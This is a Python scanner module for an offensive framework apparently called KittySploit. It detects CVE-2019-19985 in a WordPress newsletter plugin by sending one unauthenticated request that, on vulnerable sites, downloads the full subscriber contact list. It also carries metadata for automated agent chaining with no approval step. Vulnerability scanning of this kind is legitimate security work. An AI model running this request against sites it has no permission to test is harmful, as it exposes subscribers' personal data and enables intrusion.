#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Email Subscribers & Newsletters plugin before 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Email Subscribers & Newsletters <4.2.3 - Arbitrary File Retrieval Detection',
        'description': 'WordPress Email Subscribers & Newsletters plugin before 4.2.3 is susceptible to arbitrary file retrieval via a flaw that allows unauthenticated file download and user information disclosure. An attacker can obtain sensitive information, modify data, and/or execute unauthorized administrative operations.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'wordpress', 'wp-plugin', 'edb', 'packetstorm', 'icegram', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/48698',
            'https://wpvulndb.com/vulnerabilities/9946',
            'https://www.wordfence.com/blog/2019/11/multiple-vulnerabilities-patched-in-email-subscribers-newsletters-plugin/',
            'http://packetstormsecurity.com/files/158563/WordPress-Email-Subscribers-And-Newsletters-4.2.2-File-Disclosure.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-19985',
        ],
        'cve': 'CVE-2019-19985',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin.php?page=download_report&report=users&status=all', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('Name', 'Email', 'Status', 'Created On',)
        header_any = ('Content-Disposition: attachment; filename=all-contacts.csv;',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Email Subscribers & Newsletters <4.2.3 - Arbitrary File Retrieval detected",
                path='/wp-admin/admin.php?page=download_report&report=users&status=all',
            )
            return True
        return False

